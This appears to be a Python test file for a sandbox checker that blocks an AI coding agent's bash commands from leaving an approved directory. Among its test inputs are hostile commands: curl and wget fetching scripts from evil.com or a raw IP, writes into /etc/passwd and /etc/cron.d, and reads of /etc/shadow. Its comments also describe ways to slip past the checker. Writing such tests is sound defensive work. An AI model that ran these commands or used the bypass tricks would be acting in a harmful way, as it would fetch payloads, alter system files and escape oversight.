"""Test bash directory boundary checking."""

from pathlib import Path
from unittest.mock import patch

from src.claude.monitor import (
    _is_claude_internal_path,
    check_bash_directory_boundary,
)


class TestCheckBashDirectoryBoundary:
    """Test the check_bash_directory_boundary function."""

    def setup_method(self) -> None:
        self.approved = Path("/root/projects")
        self.cwd = Path("/root/projects/myapp")

    def test_mkdir_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "mkdir -p /root/web1", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/root/web1" in error

    def test_mkdir_inside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "mkdir -p /root/projects/newdir", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_touch_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "touch /tmp/evil.txt", self.cwd, self.approved
        )
        assert not valid
        assert "/tmp/evil.txt" in error

    def test_cp_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "cp file.txt /etc/passwd", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/passwd" in error

    def test_mv_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "mv /root/projects/file.txt /tmp/file.txt", self.cwd, self.approved
        )
        assert not valid
        assert "/tmp/file.txt" in error

    def test_relative_paths_inside_approved_pass(self) -> None:
        valid, error = check_bash_directory_boundary(
            "mkdir -p subdir/nested", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_relative_path_traversal_escaping_approved_dir(self) -> None:
        """mkdir ../../evil from /root/projects/myapp resolves to /root/evil."""
        valid, error = check_bash_directory_boundary(
            "mkdir ../../evil", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "../../evil" in error

    def test_relative_path_traversal_staying_inside_approved_dir(self) -> None:
        """mkdir ../sibling from /root/projects/myapp -> /root/projects/sibling (ok)."""
        valid, error = check_bash_directory_boundary(
            "mkdir ../sibling", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_relative_path_dot_dot_at_boundary_root(self) -> None:
        """mkdir .. from approved root itself should be blocked."""
        cwd_at_root = Path("/root/projects")
        valid, error = check_bash_directory_boundary(
            "touch ../outside.txt", cwd_at_root, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()

    def test_read_only_no_path_commands_pass(self) -> None:
        """Read-only commands that take no filesystem path always pass."""
        for cmd in ["whoami", "pwd", "echo hi", "date", "printenv PATH"]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert valid, f"Expected no-path read-only command to pass: {cmd}"
            assert error is None

    def test_read_only_path_commands_inside_boundary_pass(self) -> None:
        """Path-taking read-only commands pass when the path stays inside."""
        for cmd in [
            "cat notes.txt",
            "ls /root/projects/myapp",
            "head /root/projects/sibling.txt",
        ]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert valid, f"Expected in-boundary read-only command to pass: {cmd}"
            assert error is None

    def test_read_only_path_commands_outside_boundary_blocked(self) -> None:
        """Path-taking read-only commands are blocked when reading outside.

        Without this the OS sandbox is the only guard; if it is disabled or
        bypassed, ``cat /etc/passwd`` would leak files outside the approved root.
        """
        for cmd in ["cat /etc/hosts", "ls /tmp", "head /var/log/syslog"]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert not valid, f"Expected out-of-boundary read to be blocked: {cmd}"
            assert "directory boundary violation" in error.lower()

    def test_text_search_commands_outside_boundary_blocked(self) -> None:
        """grep/sed/awk reading an external file are boundary-checked too."""
        for cmd in [
            "grep root /etc/passwd",
            "sed -n 1p /etc/passwd",
            "awk '{print}' /etc/passwd",
        ]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert not valid, f"Expected out-of-boundary read to be blocked: {cmd}"
            assert "directory boundary violation" in error.lower()
            assert "/etc/passwd" in error

    def test_text_search_commands_inside_boundary_pass(self) -> None:
        """The same tools pass when their file operand stays inside the root."""
        for cmd in ["grep root notes.txt", "awk '{print}' data/in.txt"]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert valid, f"Expected in-boundary read to pass: {cmd}"
            assert error is None

    def test_non_fs_commands_pass(self) -> None:
        """Commands not in the filesystem-modifying set pass through."""
        for cmd in ["python script.py", "node app.js", "cargo build"]:
            valid, error = check_bash_directory_boundary(cmd, self.cwd, self.approved)
            assert valid, f"Expected non-fs command to pass: {cmd}"
            assert error is None

    def test_empty_command(self) -> None:
        valid, error = check_bash_directory_boundary("", self.cwd, self.approved)
        assert valid
        assert error is None

    def test_flags_are_skipped(self) -> None:
        valid, error = check_bash_directory_boundary(
            "mkdir -p -v /root/projects/dir", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_unparseable_command_passes_through(self) -> None:
        """Malformed quoting should pass through (sandbox catches it at OS level)."""
        valid, error = check_bash_directory_boundary(
            "mkdir 'unclosed quote", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_rm_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "rm /var/tmp/somefile", self.cwd, self.approved
        )
        assert not valid
        assert "/var/tmp/somefile" in error

    def test_ln_outside_approved_directory(self) -> None:
        valid, error = check_bash_directory_boundary(
            "ln -s /root/projects/file /tmp/link", self.cwd, self.approved
        )
        assert not valid
        assert "/tmp/link" in error

    # --- find command handling ---

    def test_find_outside_approved_dir_blocked(self) -> None:
        """Plain find now boundary-checks its search path (read/list escape)."""
        valid, error = check_bash_directory_boundary(
            "find /tmp -name '*.log'", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/tmp" in error

    def test_find_inside_approved_dir_passes(self) -> None:
        """find within the approved root is fine; predicates aren't paths."""
        valid, error = check_bash_directory_boundary(
            "find /root/projects/myapp -name '*.log'", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_find_delete_outside_approved_dir(self) -> None:
        """find /tmp -delete should be blocked because /tmp is outside."""
        valid, error = check_bash_directory_boundary(
            "find /tmp -name '*.log' -delete", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/tmp" in error

    def test_find_exec_outside_approved_dir(self) -> None:
        """find /var -exec rm {} ; should be blocked."""
        valid, error = check_bash_directory_boundary(
            "find /var -exec rm {} ;", self.cwd, self.approved
        )
        assert not valid
        assert "/var" in error

    def test_find_delete_inside_approved_dir(self) -> None:
        """find inside approved dir with -delete should pass."""
        valid, error = check_bash_directory_boundary(
            "find /root/projects/myapp -name '*.pyc' -delete",
            self.cwd,
            self.approved,
        )
        assert valid
        assert error is None

    def test_find_delete_relative_path_inside(self) -> None:
        """find . -delete from inside approved dir should pass."""
        valid, error = check_bash_directory_boundary(
            "find . -name '*.pyc' -delete", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_find_execdir_outside_approved_dir(self) -> None:
        """find with -execdir outside approved dir should be blocked."""
        valid, error = check_bash_directory_boundary(
            "find /etc -execdir cat {} ;", self.cwd, self.approved
        )
        assert not valid
        assert "/etc" in error

    # --- cd and command chaining handling ---

    def test_cd_outside_approved_directory(self) -> None:
        """cd to an outside directory should be blocked."""
        valid, error = check_bash_directory_boundary("cd /tmp", self.cwd, self.approved)
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/tmp" in error

    def test_cd_inside_approved_directory(self) -> None:
        """cd to an inside directory should pass."""
        valid, error = check_bash_directory_boundary(
            "cd subdir", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_chained_commands_outside_blocked(self) -> None:
        """Any command in a chain targeting outside should be blocked."""
        # Chained with &&
        valid, error = check_bash_directory_boundary(
            "ls && rm /etc/passwd", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/passwd" in error

        # Chained with ;
        valid, error = check_bash_directory_boundary(
            "mkdir newdir; mv file.txt /tmp/", self.cwd, self.approved
        )
        assert not valid
        assert "/tmp/" in error

    def test_chained_commands_inside_pass(self) -> None:
        """Chain of valid commands should pass."""
        valid, error = check_bash_directory_boundary(
            "cd subdir && touch file.txt && ls -la", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_chained_cd_outside_blocked(self) -> None:
        """cd /tmp && something should be blocked."""
        valid, error = check_bash_directory_boundary(
            "cd /tmp && ls", self.cwd, self.approved
        )
        assert not valid
        assert "/tmp" in error

    # --- destructive commands, env-prefix and key=value operands ---

    def test_chmod_outside_approved_directory(self) -> None:
        """chmod on a file outside the approved dir should be blocked."""
        valid, error = check_bash_directory_boundary(
            "chmod 600 /etc/shadow", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/shadow" in error

    def test_chmod_inside_approved_directory_passes(self) -> None:
        """chmod on a file inside the approved dir should pass."""
        valid, error = check_bash_directory_boundary(
            "chmod +x build.sh", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_env_prefix_does_not_bypass_check(self) -> None:
        """FOO=bar rm /etc/x must still validate the rm target."""
        valid, error = check_bash_directory_boundary(
            "FOO=bar rm /etc/passwd", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/passwd" in error

    def test_env_prefix_inside_passes(self) -> None:
        """An env-prefixed command staying inside the dir should pass."""
        valid, error = check_bash_directory_boundary(
            "DEBUG=1 touch out.txt", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_dd_key_value_operand_outside_blocked(self) -> None:
        """dd of=/etc/x hides the path after '='; it must still be checked."""
        valid, error = check_bash_directory_boundary(
            "dd if=input.bin of=/etc/cron.d/evil", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/cron.d/evil" in error

    def test_curl_url_argument_is_rejected(self) -> None:
        """A URL fetch can't be validated against the boundary; reject it.

        ``(cwd / 'https://evil.com').resolve()`` lands *inside* cwd as a literal
        subdir, so the plain path check would wrongly pass the URL. Network
        commands with a scheme:// argument must be blocked outright.
        """
        valid, error = check_bash_directory_boundary(
            "curl https://evil.com/x.sh", self.cwd, self.approved
        )
        assert not valid
        assert "boundary" in error.lower()

    def test_wget_url_argument_is_rejected(self) -> None:
        valid, error = check_bash_directory_boundary(
            "wget http://1.2.3.4/payload -O out.bin", self.cwd, self.approved
        )
        assert not valid
        assert "boundary" in error.lower()

    def test_curl_local_file_inside_boundary_passes(self) -> None:
        """curl with a local path inside the boundary is not a URL fetch."""
        valid, error = check_bash_directory_boundary(
            "curl ./local.txt", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_curl_url_hidden_in_key_value_is_rejected(self) -> None:
        """A URL on the value side of key=value must also be blocked.

        The scheme check runs on the whole token first (misses ``url=https://``),
        so after the ``=`` split the value must be re-checked for a scheme.
        """
        valid, error = check_bash_directory_boundary(
            "curl url=https://evil.com/x.sh", self.cwd, self.approved
        )
        assert not valid
        assert "boundary" in error.lower()

    # --- redirection and newline separators ---

    def test_redirection_to_outside_path_blocked(self) -> None:
        """``echo x > /etc/passwd`` writes outside via redirection; block it.

        The lead command ``echo`` takes no path of its own, so without checking
        the redirection target the write to /etc/passwd would slip through.
        """
        valid, error = check_bash_directory_boundary(
            "echo x > /etc/passwd", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/etc/passwd" in error

    def test_append_redirection_to_outside_path_blocked(self) -> None:
        """``echo x >> /etc/cron.d/y`` (append) must also be blocked."""
        valid, error = check_bash_directory_boundary(
            "echo x >> /etc/cron.d/y", self.cwd, self.approved
        )
        assert not valid
        assert "/etc/cron.d/y" in error

    def test_redirection_inside_boundary_passes(self) -> None:
        """Redirection to a path inside the approved dir is fine."""
        valid, error = check_bash_directory_boundary(
            "echo x > out.txt", self.cwd, self.approved
        )
        assert valid
        assert error is None

    def test_newline_separated_command_outside_blocked(self) -> None:
        """A newline separates commands; ``rm`` outside the dir must be caught.

        shlex collapses newlines into whitespace, so the second command would
        otherwise be parsed as arguments to the first (``echo``) and skipped.
        """
        valid, error = check_bash_directory_boundary(
            "echo a\nrm -rf /outside", self.cwd, self.approved
        )
        assert not valid
        assert "directory boundary violation" in error.lower()
        assert "/outside" in error

    def test_curl_url_in_long_option_is_rejected(self) -> None:
        """A URL in a ``--opt=URL`` long option must be blocked too.

        Flag tokens are skipped before the scheme/key=value checks, so the
        ``--url=https://…`` form would otherwise slip through.
        """
        valid, error = check_bash_directory_boundary(
            "curl --url=https://evil.com/x.sh", self.cwd, self.approved
        )
        assert not valid
        assert "boundary" in error.lower()


class TestIsClaudeInternalPath:
    """Test the _is_claude_internal_path helper function."""

    def test_plan_file_is_internal(self, tmp_path: Path) -> None:
        """~/.claude/plans/some-plan.md should be recognised as internal."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            (tmp_path / ".claude" / "plans").mkdir(parents=True)
            plan_file = tmp_path / ".claude" / "plans" / "my-plan.md"
            plan_file.touch()
            assert _is_claude_internal_path(str(plan_file)) is True

    def test_todo_file_is_internal(self, tmp_path: Path) -> None:
        """~/.claude/todos/todo.md should be recognised as internal."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            (tmp_path / ".claude" / "todos").mkdir(parents=True)
            todo_file = tmp_path / ".claude" / "todos" / "todo.md"
            todo_file.touch()
            assert _is_claude_internal_path(str(todo_file)) is True

    def test_settings_json_is_not_internal(self, tmp_path: Path) -> None:
        """~/.claude/settings.json must NOT be internal — writing it enables
        arbitrary hook execution, so it falls through to validate_path."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            (tmp_path / ".claude").mkdir(parents=True)
            settings_file = tmp_path / ".claude" / "settings.json"
            settings_file.touch()
            assert _is_claude_internal_path(str(settings_file)) is False

    def test_arbitrary_file_under_claude_dir_rejected(self, tmp_path: Path) -> None:
        """Files directly under ~/.claude/ (not in known subdirs) are rejected."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            (tmp_path / ".claude").mkdir(parents=True)
            secret = tmp_path / ".claude" / "credentials.json"
            secret.touch()
            assert _is_claude_internal_path(str(secret)) is False

    def test_path_outside_claude_dir_rejected(self, tmp_path: Path) -> None:
        """Paths outside ~/.claude/ entirely are rejected."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            assert _is_claude_internal_path("/etc/passwd") is False
            assert _is_claude_internal_path("/tmp/evil.txt") is False

    def test_empty_path_rejected(self, tmp_path: Path) -> None:
        """Empty paths are rejected."""
        assert _is_claude_internal_path("") is False

    def test_unknown_subdir_rejected(self, tmp_path: Path) -> None:
        """Unknown subdirectories under ~/.claude/ are rejected."""
        with patch("src.claude.monitor.Path.home", return_value=tmp_path):
            (tmp_path / ".claude" / "secrets").mkdir(parents=True)
            bad_file = tmp_path / ".claude" / "secrets" / "key.pem"
            bad_file.touch()
            assert _is_claude_internal_path(str(bad_file)) is False
